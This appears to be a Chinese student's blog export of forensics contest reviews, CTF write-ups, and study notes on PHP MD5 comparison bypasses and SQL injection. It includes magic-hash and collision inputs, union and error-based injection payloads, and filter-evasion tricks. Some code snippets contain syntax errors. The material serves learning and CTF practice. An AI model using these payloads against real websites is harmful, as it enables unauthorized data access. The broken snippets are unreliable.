[{"title":"25校内电子取证初赛","url":"/2025/11/27/25校内电子取证初赛/","content":"## 粗略复盘（暂无官方答案）\n- 多谢两位名师cty学姐和zxx学长\n- 呜呜呜我何德何能受到两位老师的教导(´⊙ω⊙`)，还是太幸福了٩(๑´3｀๑)۶\n---\n- 银行卡号\n![alt text](/img/25校内电子取证初赛_image-17.png)\n---\n- 统计失败。。坐等答案\n![alt text](/img/25校内电子取证初赛_image.png)\n---\n- 本地模型\n![alt text](/img/25校内电子取证初赛_image-1.png)\n---\n- 搜索模型名字\n![alt text](/img/25校内电子取证初赛_image-2.png)\n![alt text](/img/25校内电子取证初赛_image-18.png)\n---\n- /etc/ssh/sshd_config 是 OpenSSH 服务端的主要配置文件，用于定义 SSH 服务的行为和安全策略\n![alt text](/img/25校内电子取证初赛_image-3.png)\n- 所以只能连100的\n- 改网卡+nat别用仅主机\n- 还有别设1的会和家里网冲突（默认为1）\n---\n- 获得MYSQL账密\n  - mysql默认端口3306，使用filelocater\n![alt text](/img/25校内电子取证初赛_image-4.png)\n![alt text](/img/25校内电子取证初赛_image-5.png)\n  - 直接搜mysql，查看上方引用文件，打开看到账密\n![alt text](/img/25校内电子取证初赛_image-7.png)\n---\n- 网站加密方式\n  - 数据库看到md5加密，直接搜\n![alt text](/img/25校内电子取证初赛_image-6.png)\n![alt text](/img/25校内电子取证初赛_image-8.png)\n---\n- 网站URI\n---\n- rsa加密私匙变量名，文件内搜private\n![alt text](/img/25校内电子取证初赛_image-9.png)\n![alt text](/img/25校内电子取证初赛_image-10.png)\n---\n- 超级管理员密码直接管理日志找\n![alt text](/img/25校内电子取证初赛_image-11.png)\n---\n![alt text](/img/25校内电子取证初赛_image-13.png)\n---\n![alt text](/img/25校内电子取证初赛_image-12.png)\n---\n![alt text](/img/25校内电子取证初赛_image-14.png)\n---\n![alt text](/img/25校内电子取证初赛_image-15.png)\n---\n![alt text](/img/25校内电子取证初赛_image-16.png)\n---"},{"title":"24ISCTF","url":"/2025/11/27/24ISCTF/","content":"### File_Format\n![alt text](/img/24ISCTF_image-1.png)\n![alt text](/img/24ISCTF_image.png)\n![alt text](/img/24ISCTF_image-2.png)\n- 改回exe输密码解压\n\n### starry sky\n- 随波逐流爆图片\n- 尾部XORKEY:FF\n\n![alt text](/img/24ISCTF_image-3.png)\n- 010居然还有这功能！！？\n\n![alt text](/img/24ISCTF_image-4.png)\n- 记得选无符号字节十六进制\n\n![alt text](/img/24ISCTF_image-5.png)","tags":["ctf","isctf","24"]},{"title":"【转载】md5相关","url":"/2025/11/25/【转载】md5相关/","content":"# 【转载】Md5绕过\n- 作者：cty\n- 弱类型绕过\n  - 0e绕过\n```\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\ns214587387a\ns878926199a\n```\n  - 强类型绕过\n    - 数组绕过\n```\n?val1[]=1&val2[]=2\n```\n- 终极\n```\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n# 【转载】md5相等及碰撞绕过\n- 作者：陈耿直\n- 来源：<https://blog.csdn.net/weixin_44511709/article/details/102912004>\n\n- 在ctf中经常会遇到要求v1!=v2，但md5(v1)==md5(v2)的情况，所以上网搜集了一下资料，学习了一下大佬的思路，拓展思路。\n- 在php中，变量都是弱类型的（就是不指定特定数据类型的），使用if判等的时候要格外小心，使用特殊的参数可能会使本来不相等的if判断位相等，比如下面的例子。\n```php\n<?php \n\nif (isset($_GET['a']) && isset($_GET['b'])) {\n\t$a = $_GET['a'];\n\t$b = $_GET['b'];\n\tif ($a != $b && md5($a) == md5($b)) {\n\t\techo \"flag{XXXXX}\";\n\t} else {\n\t\techo \"wrong!\";\n\t}\n\n} else {\n\techo 'wrong!';\n}\n\n?>\n```\n- 上面只要传入参数a=s1885207154a，b=s1836677006a，即可，为什么呢？看一下这两个字符串的md5值可以返现分别如下：\n```\nMD5值\nmd5(\"s1885207154a\") => 0e509367213418206700842008763514\nmd5(\"s1836677006a\") => 0e481036490867661113260034900752\n```\n- 二者都是0e开头，在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过\n## 拓展 双md5碰撞绕过\n\n```php\n<?php \n\nif (isset($_GET['a']) && isset($_GET['b'])) {\n\t$a = $_GET['a'];\n\t$b = $_GET['b'];\n\tif ($a != $b && md5($a) == md5(md5($b)) {\n\t\techo \"flag{XXXXX}\";\n\t} else {\n\t\techo \"wrong!\";\n\t}\n\n} else {\n\techo 'wrong!';\n}\n\n?>\n```\n```\nMD5值\nmd5(\"V5VDSHva7fjyJoJ33IQl\") => 0e18bb6e1d5c2e19b63898aeed6b37ea\nmd5(\"0e18bb6e1************\") => 0e0a710a092113dd5ec9dd47d4d7b86f\n```\n## 拓展2 双md5结果仍是0e开头字符串大全\n```\nMD5大全\nCbDLytmyGm2xQyaLNhWn\nmd5(CbDLytmyGm2xQyaLNhWn) => 0ec20b7c66cafbcc7d8e8481f0653d18\nmd5(md5(CbDLytmyGm2xQyaLNhWn)) => 0e3a5f2a80db371d4610b8f940d296af\n770hQgrBOjrcqftrlaZk\nmd5(770hQgrBOjrcqftrlaZk) => 0e689b4f703bdc753be7e27b45cb3625\nmd5(md5(770hQgrBOjrcqftrlaZk)) => 0e2756da68ef740fd8f5a5c26cc45064\n7r4lGXCH2Ksu2JNT3BYM\nmd5(7r4lGXCH2Ksu2JNT3BYM) => 0e269ab12da27d79a6626d91f34ae849\nmd5(md5(7r4lGXCH2Ksu2JNT3BYM)) => 0e48d320b2a97ab295f5c4694759889f\n```\n### 拓展3 md5碰撞脚本\n```python\n# -*- coding: utf-8 -*-\nimport multiprocessing\nimport hashlib\nimport random\nimport string\nimport sys\nCHARS = string.letters + string.digits\ndef cmp_md5(substr, stop_event, str_len,. start=0, size=20):\n    global CHARS\n    while not stop_event.is_set():\n        rnds = ''.join(random.choice(CHARS) for _ in range(size))\n        md5 = hashlib.md5(rnds)\n        value = md5.hexdigest()\n        if value[start: start+str_len] == substr:\n            print rnds\n            stop_event.set()\n            '''\n            #碰撞双md5\n            md5 = hashlib.md5(value)\n            if md5.hexdigest()[start: start+str_len] == substr:\n            \tprint rnds+ \"=>\" + value+\"=>\"+ md5.hexdigest()  + \"\\n\"\n                stop_event.set()\n            '''\n\nif __name__ == '__main__':\n    substr = sys.argv[1].strip()\n    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0\n    str_len = len(substr)\n    cpus = multiprocessing.cpu_count()\n    stop_event = multiprocessing.Event()\n    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,\n                                         stop_event, str_len, start_pos))\n                 for i in range(cpus)]\n    for p in processes:\n        p.start()\n    for p in processes:\n        p.join()\n```\n- 上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。\n- 使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置\n- 例如：python md5Crack.py “0e\" 0\n- 将产生MD5值为0e开头的字符串。\n\n"},{"title":"25警铮杯wp","url":"/2025/11/24/25警铮杯wp/","content":"\n- [致谢](#致谢)\n- [理论错题](#理论错题)\n- [实操](#实操)\n- [题目](#题目)\n  - [1. 现在是手机取证题目（1-6）！分析手机备份文件，该机主的QQ号为？（标准格式：123）（2分）](#1-现在是手机取证题目1-6分析手机备份文件该机主的qq号为标准格式1232分)\n  - [4+5. 请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）（4分）/请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）（4分）](#45-请分析机主的银行卡卡号是多少标准格式按照实际值填写4分请分析出幕后老大王子勇的最新手机号码是多少标准格式12345674分)\n  - [8. 请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970/06/17 23:25:41）（4分）](#8-请问计算机管理员用户的设置密码时间是什么时候标准格式19700617-2325414分)\n  - [【9+10都和官方答案不符，下方文字谨慎参考】](#910都和官方答案不符下方文字谨慎参考)\n  - [9. 分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）（4分）](#9-分析数据文件夹中的表格文件共有有多少个两个字的姓名人数标准格式104分)\n  - [10. 请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）（4分）](#10-请分析数据文件夹中表格共有多少姓陈的人标准格式104分)\n  - [11. 请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）（4分）](#11-请问计算机映射盘的挂载位置盘符是什么标准格式b4分)\n  - [14. Web.01虚拟机中设置的静态ip是什么？(格式：172.0.0.1)（4分）](#14-web01虚拟机中设置的静态ip是什么格式1720014分)\n  - [15. Web.01中的ssh端口号是多少？(格式：8080)（4分）](#15-web01中的ssh端口号是多少格式80804分)\n  - [16. 80端口所对应的服务是？(格式：apache)（4分）](#16-80端口所对应的服务是格式apache4分)\n  - [19. 该数据库名下有多少张表？(格式：55)（4分）](#19-该数据库名下有多少张表格式554分)\n  - [总结：](#总结)\n  - [20. 该网站后台登录密码的密码额外加密字符是？(格式：ijia62asdz)（6分）](#20-该网站后台登录密码的密码额外加密字符是格式ijia62asdz6分)\n  - [21. 在网站后台查看到的完美通讯app有多少用户？(格式：1234)（4分）](#21-在网站后台查看到的完美通讯app有多少用户格式12344分)\n  - [22. 完美通讯app的登录邀请码是？(格式：1234567)（4分）](#22-完美通讯app的登录邀请码是格式12345674分)\n- [ctf](#ctf)\n  - [6. 海上遇到了鲨鱼](#6-海上遇到了鲨鱼)\n  - [7. 海上又遇了鲨鱼](#7-海上又遇了鲨鱼)\n  - [9. 27262524热身一下](#9-27262524热身一下)\n  - [10. 反方向的雪](#10-反方向的雪)\n  - [11.不是哥们，一百多页？](#11不是哥们一百多页)\n  - [reverse](#reverse)\n\n\n\n\nVC密码：cqpu@qz2025#$%^&*fgs45\n## 致谢\n- 感谢sq学长熬夜赶出来的wp卷死我得了呜呜呜好可怕好可怕好可怕\n\n## 理论错题\n![alt text](/img/25警铮杯wp_image-32.png)\n![alt text](/img/25警铮杯wp_image-33.png)\n- 6/18\n\n![alt text](/img/25警铮杯wp_image-34.png)\n![alt text](/img/25警铮杯wp_image-35.png)\n![alt text](/img/25警铮杯wp_image-36.png)\n## 实操\n![alt text](/img/25警铮杯wp_image-37.png)\n\n\n\n![alt text](/img/25警铮杯wp_image-39.png)\n![alt text](/img/25警铮杯wp_image-40.png)\n\n\n## 题目\n### 1. 现在是手机取证题目（1-6）！分析手机备份文件，该机主的QQ号为？（标准格式：123）（2分）\n> 一开始还纳闷为什么火眼没有仿真出来，结果发现确实压根就没有QQ,是藏在火眼的关联账号里\n\n![alt text](/img/25警铮杯wp_image.png)\n- 以后一定要注意！！！\n\n### 4+5. 请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）（4分）/请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）（4分）\n- 烦死了看到友联了愣是没翻文件，蠢。。。\n\n![alt text](/img/25警铮杯wp_image-1.png)\n\n### 8. 请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970/06/17 23:25:41）（4分）\n![alt text](/img/25警铮杯wp_image-2.png)\n- 去找了其他地方。。。\n\n\n### 【9+10都和官方答案不符，下方文字谨慎参考】\n### 9. 分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）（4分）\n- 这真没办法，基础不牢，excel不会啊，当时翻是翻到了\n- 学下sq学长的\n> 然后就是大数据时间，可以把这些都复制粘贴到一个表里\n> ![alt text](/img/25警铮杯wp_image-3.png)\n- 我第一步是用的数据透视表\n- 后一步同理`=COUNTIF(An:Am,\"??\")`\n\n![alt text](/img/25警铮杯wp_image-4.png)\n- 。。。咋不对\n\n- 复刻下\n\n![alt text](/img/25警铮杯wp_image-5.png)\n- 发现问题了，我筛名字，sq学长筛身份证\n- 【待】\n### 10. 请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）（4分）\n![alt text](/img/25警铮杯wp_image-6.png)\n- 仨名字和俩的加起来9个\n\n![alt text](/img/25警铮杯wp_image-7.png)\n- 要学会用`*`哦！！！\n\n### 11. 请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）（4分）\n![alt text](/img/25警铮杯wp_image-8.png)\n- 错了\n\n![alt text](/img/25警铮杯wp_image-38.png)\n### 14. Web.01虚拟机中设置的静态ip是什么？(格式：172.0.0.1)（4分）\n![alt text](/img/25警铮杯wp_image-9.png)\n- 行，下回记得静态ip在这里找！！！\n\n### 15. Web.01中的ssh端口号是多少？(格式：8080)（4分）\n> 问端口号，直接输入命令`systemctl status sshd`\n> 噢还没开啊那我们先启用一下`systemctl start sshd`\n> 好这回开了，开在7001上了,答案是7001\n\n- 我干了我真的都干了就是开不起来！！！！！我要maren了\n- 复刻下\n\n![alt text](/img/25警铮杯wp_image-10.png)\n- 真无语了为什么现在就成功了啊我没辙了\n- 不管了玄学了有点\n- 。。。找到原因了命令少打了一个d【因为准备的时候学到kali开ssh方法但是都没有d。。查一查】\n- ssh还是得加网卡才连的上。。\n\n### 16. 80端口所对应的服务是？(格式：apache)（4分）\n- `netstat -tunlp`发现压根就没有80端口开着\n- 这比赛快把我所有学到过的命令全用上了，出题还是很厉害的。。但我个蠢货到现在还是不知道为什么搞不起来ssh\n\n![alt text](/img/25警铮杯wp_image-11.png)\n![alt text](/img/25警铮杯wp_image-12.png)\n- 这个考试倒是看到了猜了下\n- 开nginx命令不知道，记录下\n```bash\nsystemctl start nginx\nsystemctl status nginx\nsystemctl start mysql #开mysql命令，虽然后面火眼看到了但记录下\n```\n![alt text](/img/25警铮杯wp_image-13.png)\n\n### 19. 该数据库名下有多少张表？(格式：55)（4分）\n- `bt default`启动宝塔\n- 死活当时连不上，怀疑端口范围问题，还是当时没反应过来，下回一定要记住加网卡，留个`ip a`的截图就行了\n- `bt 5`改密码\n- 超级奇怪我把联网的网卡改198.110.1了shh就能连上198.110.1.111了莫名其妙\n- 不是我都没用我改的8用的原来的2...受不了了\n\n\n- sq学长五分钟解决。。。。太强了\n![alt text](/img/25警铮杯wp_image-22.png)\n\n![alt text](/img/25警铮杯wp_image-23.png)\n![alt text](/img/25警铮杯wp_image-24.png)\n### 总结：\n- 连宝塔\n```bash\nsystemctl start sshd\nsystemctl start mysql\nsystemctl start mysqld\nsystemctl start nginx\nsystemctl start bt\n# systemctl restart bt\nsystemctl daemon-reload\nfirewall-cmd --zone=public --remove-port=8888/tcp --permanent\nnetstat -tunlp\nbt default\nbt 5 \n\n```\n### 20. 该网站后台登录密码的密码额外加密字符是？(格式：ijia62asdz)（6分）\n![alt text](/img/25警铮杯wp_image-25.png)\n### 21. 在网站后台查看到的完美通讯app有多少用户？(格式：1234)（4分）\n- 域名还没有正式解析到我的IP\n- 所以改host+放行端口80\n\n![alt text](/img/25警铮杯wp_image-26.png)\n- 其实就是以管理员身份来运行了C:\\Windows\\System32\\drivers\\etc\\hosts\n\n![alt text](/img/25警铮杯wp_image-27.png)\n![alt text](/img/25警铮杯wp_image-28.png)\n- 密码算下123456 md5加上20题答案md5 再md5\n\n![alt text](/img/25警铮杯wp_image-29.png)\n![alt text](/img/25警铮杯wp_image-30.png)\n### 22. 完美通讯app的登录邀请码是？(格式：1234567)（4分）\n![alt text](/img/25警铮杯wp_image-31.png)\n\n## ctf\n### 6. 海上遇到了鲨鱼\n![alt text](/img/25警铮杯wp_image-14.png)\n- 当时手动搞的，记录下厨子还有这功能\n### 7. 海上又遇了鲨鱼\n![alt text](/img/25警铮杯wp_image-15.png)\n\n- neta解法\n\n![alt text](/img/25警铮杯wp_image-16.png)\n### 9. 27262524热身一下\n- 当时用另外个爆破软件。。。下回记得换软件多试试\n\n![alt text](/img/25警铮杯wp_image-17.png)\n```python\nimport os\nimport pyzipper\n\n\ndef decompress_and_decrypt(compressed_file, output_path, password):\n    with pyzipper.AESZipFile(compressed_file) as zf:\n        zf.setpassword(password.encode())\n        zf.extractall(path=output_path)\n\n\ndef main():\n    # 解压路径，确保该目录存在或根据需要创建它\n    extract_to = '.'\n    ifnot os.path.exists(extract_to):\n        os.makedirs(extract_to)\n\n    previous_extracted = None\n\n    for i in range(27, 0, -1):  # 从26到1反向解压\n        number_str = str(i).zfill(2)  # 确保数字是两位数，如26, 25...\n        password = number_str * 3# 创建密码，如262626\n\n        compressed_file = f'{number_str}.zip'\n\n        # 每次解压都输出到extract_to目录下\n        decompress_and_decrypt(compressed_file, extract_to, password)\n        print(f'Decompressed and decrypted: {compressed_file} with password {password}')\n\n        # 更新previous_extracted为当前解压后的文件夹，以便处理嵌套的ZIP文件\n        previous_extracted = os.path.join(extract_to, os.path.splitext(os.path.basename(compressed_file))[0])\n\n    # 最终解压出来的应该是原始文件，如果所有ZIP都是单个文件的话\n    final_extracted_file = os.listdir(extract_to)[0] if os.listdir(extract_to) elseNone\n    print(f'Final extracted file: {final_extracted_file}')\n\n\nif __name__ == '__main__':\n    main()\n\n```\n### 10. 反方向的雪\n- 我直接全部翻转，损坏压缩包，所以还是得只翻转文件尾内容，不死心，再试试\n- 死心了\n```python\ndef reverse_hex_pairs(hex_string):\n    hex_string = hex_string.replace(\" \", \"\")\n    if len(hex_string) % 2 != 0:\n        raise ValueError(\"十六进制字符串长度必须为偶数\")\n    pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]\n    reversed_pairs = pairs[::-1]\n    result = ''.join(reversed_pairs)\n    return result\n\ndef main():\n    original_hex = \"746572636573306e5f73695f79656b5f6568740013000000830000005a000100010000000006054b5001dc52fe0bd9dd2501dc52fe75e56fa801dc52fddcfb513500180001000000000020000a7478742e67616c66000000000000002000000000000000240008000000e80000004d83c4df265b6b9b2a000800090014001f02014b50000000e80000004d83c4df2608074b507e369b1c5d6c4d5fc6953720cf50c9da937c1242c9a0979e854c4a23ba89bbcd017ffe51c0b548510917a647e00a7dca1613b2db6d29376c01470eb02b7a769c305955bc0fc08dc08a99605d277478742e67616c6600000008000000e80000004d83c4df265b6b9b2a00080009001404034b50\"\n    try:\n        reversed_hex = reverse_hex_pairs(original_hex)\n        print(\"原始十六进制字符串长度:\", len(original_hex))\n        print(\"倒序后十六进制字符串长度:\", len(reversed_hex))\n        print(\"\\n倒序结果:\")\n        print(reversed_hex)\n        formatted_result = ' '.join([reversed_hex[i:i+2] for i in range(0, len(reversed_hex), 2)])\n        print(\"\\n格式化显示（每两个字符一组）:\")\n        print(formatted_result)\n        \n    except Exception as e:\n        print(f\"处理过程中出现错误: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n![alt text](/img/25警铮杯wp_image-18.png)\n- 另存zip\n- 爆破520520\n\n![alt text](/img/25警铮杯wp_image-19.png)\n- 服气了\n\n### 11.不是哥们，一百多页？\n![alt text](/img/25警铮杯wp_image-20.png)\n![alt text](/img/25警铮杯wp_image-21.png)\n- 没辙了后面再搞`E:\\Downloads\\_download.jpg.extracted\\480DF\\nearend\\nearend`\n### reverse\n![alt text](/img/25警铮杯wp_image-41.png)\n\n- upx脱壳\n![alt text](/img/25警铮杯wp_image-42.png)"},{"title":"web笔记","url":"/2025/11/24/web笔记/","content":"## SQL注入\n### sql查询\n  - `select * from users where id = 1;`或者`where id in ('3')`\n  - 子查询：括号内先执行，`select * from users where id = (select id from users where name = admin)`\n- union\n  - 保证前后列数一致\n- 列数判断\n  - group by(有点小问题但可以帮助waf绕过)\n    - 二分法判断列数\n    - group by n开始报错，说明只有n-1列 \n  - order by\n    - desc降序\n- `limit a,b;`从第a+1行开始显示b行（从0行开始算）\n- and or\n  - 判断闭合关系\n  - 万能钥匙or\n- 常用函数\n  - group_concat：多行变一行\n    - `select group_concat(id,name)...`\n  - select database()：查看数据库名称\n  - elect version()：版本\n\n### SQL注入基础\n- SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL 命令，从而进一步得到相应的数据信息。\n- 通过构造一条精巧的语句，来查询到想要得到的信息。\n- 注入分类\n- 按照输入的参数\n  - 字符型\n  - 数字型\n  - 使用and1=1和and1=2来判断\n    - 后者有回显：字符型（''包括了后面的and1=2）;无回显：数字型，and1=2错误\n  - 使用计算判断\n    - 数字型有计算：1和2-1的结果是否相同\n  - 数字型一般提交内容为数字，但数字不一定为数字型\n- 按照注入方法\n  - Union注入，报错注入，布尔注入，时间注入\n- 注入点\n- 闭合方式：' \" ') \") other\n  - 尝试输入' \" 然后看报错\n  - 手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数\n  - 不需要的语句可以用注释符号`--+`或`#`或`%23`注释掉\n    - 注释掉：利用注释符号暂时将程序段脱离运行\n    - 把某段程序“注释掉”，就是让它暂时不运行（而非删除掉）。\n- union联合注入\n  - 先判断列数！！！\n  - 查询回显位\n- 总结流程：\n  - 查找注入点\n  - 判断是字符型还是数字型注入\n  - 如果字符型，找到他的闭合方式\n  - 判断查询列数\n  - 查询回显位置，不需要的-1实现不显示`union select 1,2,3 --+`\n\n### union注入\n- 拿到表名，列名\n  - 默认自带：\n    - Information_schema：包含所有mysql数据库的简要信息\n    - tables：表名集合表\n    - columns：列名集合表\n- 使用：\n  - `union select table_name from information_schema.tables where table_schema=database(); --+`\n  - `union select column_name from information_schema.columns where table_schema=database() and table_name='自己填上一步得到的';--+`\n  - group_concat()放在select后，只包围回显位！！！还可以插入~区分数据\n    - 例如`' or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database(); #`\n    - `group_concat(a,'~',b)`\n  - 查列名对应内容：(假设查列名为a,b的内容)\n    - `union select 1,group_concat(a,'~',b),3 from 表名 --+v `\n- 暂时学到这里\n<https://www.bilibili.com/video/BV1c34y1h7So?buvid=XU97BB69D2A4657727B10BFBF06B3FEB6C6A2&from_spmid=search.search-result.0.0&is_story_h5=false&mid=LOw8O0fR%2FjzSBXlVqIpccw%3D%3D&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=e9cd71d3-484d-4ca1-9dba-5749bf8de4bc&share_source=WEIXIN&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1763951829&unique_k=iM5ZV9D&up_id=271803648&vd_source=ddfd8fb754dccf9e433a255c412b8d6c&spm_id_from=333.788.videopod.episodes&p=11>\n\n\n### 空格过滤绕过方法介绍\n- 绕过空格\n  - 可以代替空格的字符：\n```\n+\n%0A\n%0B\n%0D\n%A0\n/**/\n```\n  - URL编码对应：\n\n|name|URL|\n|:--:|:--:|\n|spaces|%20|\n|TAB 09 horizontal TAB|%09|\n|LF OA newline|%0A|\n|FF OC new page|%0C|\n|CR 0D carriage return|%0D|\n|VT OB vertical TAB|%OB|\n|-OA-(MySQL only)|%A0|\n  - 使用报错注入\n    - 多用括号以达到不适用空格的效果\n    - **and和or复写**\n    - `?id=1000'||extractvalue(1,concat('$',(database()))||'1'='1`\n- limit替换函数\n    - mid()与substr()用法相同\n    - `mid(string,start,length)=mid(string from start for length)`\n    - `?id=10o0'||extractvalue(1,concat('$',(select(mid(group_concat(username,):',passwoorrd),1,30))from(users))))||'1'='1`\n    - 显示前30个字符\n    - 详细的自己看\n","tags":["ctf","web"]},{"title":"25美亚个人复盘","url":"/2025/11/21/25美亚个人复盘/","content":"## 致谢\n- 感谢sq学长的wp\n\n## 资料\n- VC密码：\n个人赛：FEYn0MJLYy9zTQRFHlXGRkVqXv3IkE8h\n团体赛：ZgxQaeiAUe3nrnZ9zEnI3nAxuPIrIPl9\n\n## 学习西电（怎么这么厉害我嘞个豆）（存档下）\n- 来源：<https://forensics.xidian.edu.cn/wiki/MeiyaCup2025Individual/>\n\n> - 在检材中的 /var 目录中存储着 Info.plist Manifest.plist Manifest.db Status.plist 和文件扩展名添加了 _DEC 的 4 个文件:\n> ![alt text](/img/25美亚个人复盘_image-14.png)\n> - 文件名包含 _DEC 的是提取工具生成的解密后的文件, 因此使用这些解密后的文件覆盖原始加密的文件, 并使用 Plist Editor 将 Manifest.plist 中将备份是否加密的标志改为 false 即可得到未加密的检材文件.\n> ![alt text](/img/25美亚个人复盘_image-15.png)\n> - 之后即可将该目录作为文件集合挂载在火眼取证中进行分析了.\n> - 或者, 也可以不对文件进行覆盖, 而是只删除 Manifest.db 并对 Menifest.plist 中的加密标志进行修改, 也可以达到相同的效果.\n> - 若直接删除 Menifest.db 和 Menifest.plist, 也可以挂载检材, 但会缺失部分信息.\n\n## 1. 请你使用CHAN_MH.zip检材回答以下问题这个智能手机是什么操作系统?\n![alt text](/img/25美亚个人复盘_image.png)\n- 脑子瓦特了\n\n## 2. 在这个手机中，有多少组国际移动设备识别码(IMEI)号码? (请以阿拉伯数字作答)\n- 搜InternationalMobileEquipmentIdentity\n- 以后不止搜imei还要搜全名试试\n\n![alt text](/img/25美亚个人复盘_image-1.png)\n## 6. 蓝牙模组中的蓝牙地址是多少？(请以下格式作答:xx:xx:xx:xx:xx:xx)\n- 同2文件\n\n![alt text](/img/25美亚个人复盘_image-2.png)\n## 7. 这个智能手机曾经启动「个人热点」分享网络，请问他的「热点」名称？(请依照参赛材料中的原文作答，注意区分大小写、空格及符号)\n- **对于iOS来说是不支持本身改热点名的，热点名就是和设备名保持一致，所以我们只要找设备名就好**\n- 不到啊\n\n![alt text](/img/25美亚个人复盘_image-3.png)\n## 9. 请指出首次连接服务集识别码(SSID)名称为\" CMHK\"的无线区域网络(Wi-Fi)的日期及时间(请以GMT +8时区及以下格式作答: yyyy-MM-dd HH:mm:ss)\n- 美亚自己没答案。。。\n\n## 10. 安装了以下即时哪个通讯软件?i) WhatsAppii) WeChatiii) WhatsApp Businessiv) QQ\n- 还是得火眼应用列表，别Xways搜出来就随便信了（或者搜包名？\n- QQ没有哦\n## 11. 承上题，请指出即时通讯软件\"WhatsApp\"的版本(请依照参赛材料中的原文作答，注意区分大小写、空格及符号)\n![alt text](/img/25美亚个人复盘_image-4.png)\n- 去配置文件看：var\\mobile\\Applications\\group.net.whatsapp.WhatsApp.shared\\Library\\Preferences\\\n\n![alt text](/img/25美亚个人复盘_image-5.png)\n![alt text](/img/25美亚个人复盘_image-6.png)\n![alt text](/img/25美亚个人复盘_image-7.png)\n## 13. 承上题，与其有传送/接收过资料装置的装置ID是多少? (请依照参赛材料中的原文作答，注意区分大小写、空格及符号)\n- 上一题已经确定了是包名为com.estmob.paprika的软件，这种线下从来没遇到过的小众软件只能翻在Library文件夹下，我们能发现存在一个realm的数据库文件\n\n![alt text](/img/25美亚个人复盘_image-8.png)\n## 14. 14.承上题，这个装置名称是?(请依照参赛材料中的原文作答，注意区分大小写、空格及符号)\n![alt text](/img/25美亚个人复盘_image-9.png)\n## 15. 承上题，本机装置的装置ID是多少?(请依照参赛材料中的原文作答，注意区分大小写、空格及符号)\n- **本机ID就是这个手机的设备ID**，看这个软件里边的属性表plist文件\n- 谁知道。。\n- 没事我现在知道了（坚强）\n\n![alt text](/img/25美亚个人复盘_image-10.png)\n## 16. 承上题，陈民浩的手机(CHAN_MH_mobile.zip)是传送方或是接收方?\nA. 传送方\nB. 接收方\nC. 传送及接收方\n## 17. 根据传送档案的名称，判断是以下哪一类型? (单选)\n**A. 屏幕截图**\nB. 手机拍摄影片\nC. PDF文件\nD. zip压缩文件\n![alt text](/img/25美亚个人复盘_image-11.png)\n## 18. 承上题，接收至哪一个装置?\nA. CHAN_MH_mobile.zip\n**B. blk0_sda.bin**\nC. FUNG_CC_mobile.zip\nD. LAM_KH_Mobile.zip\nE. WONG_CW_mobile.zip\n![alt text](/img/25美亚个人复盘_image-12.png)","tags":["wp","美亚","25"],"categories":["wp"]},{"title":"警铮杯准备","url":"/2025/11/18/警铮杯准备/","content":"\n## 比赛范围\n以下是本次比赛的考核范围(仅供参考)：\n1. Linux:选择题\n- [x] 文字教程(从Linux简介到Linux vi/vim命令):https://www.runoob.com/linux/linux-file-content-manage.html\n- [x] 视频教程(P1-P26):https://www.bilibili.com/video/BV1n84y1i7td\n\n2. Mysql:客观题+实操题\n- [x] 文字教程(从Mysql安装到Mysql delete语句):https://www.runoob.com/mysql/mysql-administration.html\n- [x] 视频教程( (P1-P26)):https://www.bilibili.com/video/BV1iF411z7Pu\n\n3. Python:客观题+实操题\n- [x] 文字教程(第一章-第六章匿名函数):\nhttps://blog.csdn.net/weixin_42399800/article/details/143822422\n- [ ] 视频教程(第一阶段-第一章-01-初识Python——第一阶段-第九章-07-安装第三方包，第二阶段-第一章-01-初识对象——第二阶段-第一章-03-类和对象):\nhttps://www.bilibili.com/video/BV1qW4y1a7fU\n\n4. 数字警务技术应用：\n电子数据取证(理论题+实操题):电⼦数据取证基础知识、windows取证、⼿机取证、服务器取证、数据分析\n网络安全与攻防(实操题):图片隐写，图片修复，stegsolve应用，压缩包密码爆破，压缩包伪加密，**流量分析**，osint社工，脚本编写，base家族编码，凯撒密码，栅栏密码，rsa，异或，exe程序逆向分析，exe程序脱壳\n警务大数据(实操题):\n- [ ] **excel应用**（数据清洗，数据分析）\n网站开发(客观题):前后端语言用法，网站开发体系内容，二进制转换，全栈开发，网站开发与web服务器\n\n## 学习笔记\n### Linux视频+文字教程\n- 硬件、软件（操作系统）\n- Linux系统的组成\n  - Linux系统内核：提供系统最核心的功能，如：调度CPU、调度内存、调度文件系统、调度网络通讯、调度IO等。\n  - 系统级应用程序：可以理解为出厂自带程序，可供用户快速上手操作系统，如：文件管理器、任务管理器、图片查看、音乐播放等。\n- Linux系统发行版\n  - 